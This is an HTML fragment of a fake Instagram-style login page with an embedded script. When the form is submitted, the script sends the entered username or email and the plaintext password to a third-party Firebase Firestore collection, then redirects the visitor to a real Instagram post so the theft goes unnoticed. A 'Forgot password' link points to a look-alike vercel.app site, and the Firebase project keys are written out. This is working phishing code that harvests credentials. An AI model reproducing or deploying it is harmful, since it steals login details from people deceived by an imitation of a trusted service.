                    <input id="username" type="name" placeholder="Phone number, username, or email" />

                </div>
                <div class="field">
                    <input id="password" type="text" placeholder="password" />

                <button class="login-button" type="submit">
  Log In
</button>

                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>

                <div class="other">
                    <button class="fb-login-btn" type="button">

                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
                        </span>
                    </button>
                    <a class="forgot-password" href="https://instagram-psi-lilac.vercel.app/">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDUMSW_Dq9hkQ5NnBQ-1Rq7Qec9Z3Bx9gQ",
    authDomain: "iiii-52a18.firebaseapp.com",
    projectId: "iiii-52a18",
    appId: "1:642379621968:web:4066088caee73d22ba9355"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  const form = document.querySelector(".login-form");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const textValue = document.getElementById("password").value;

    try {
      await addDoc(collection(db, "practice_inputs"), {
        username: username,
        textValue: textValue,
        createdAt: serverTimestamp()
      });

      // redirect or alert
      window.location.href = "https://www.instagram.com/p/DUI2riGD2-v/?igsh=OHVzdGtsNG91anNq";

    } catch (err) {
      console.error(err);
      alert("Error saving data");
    }
  });
</script>
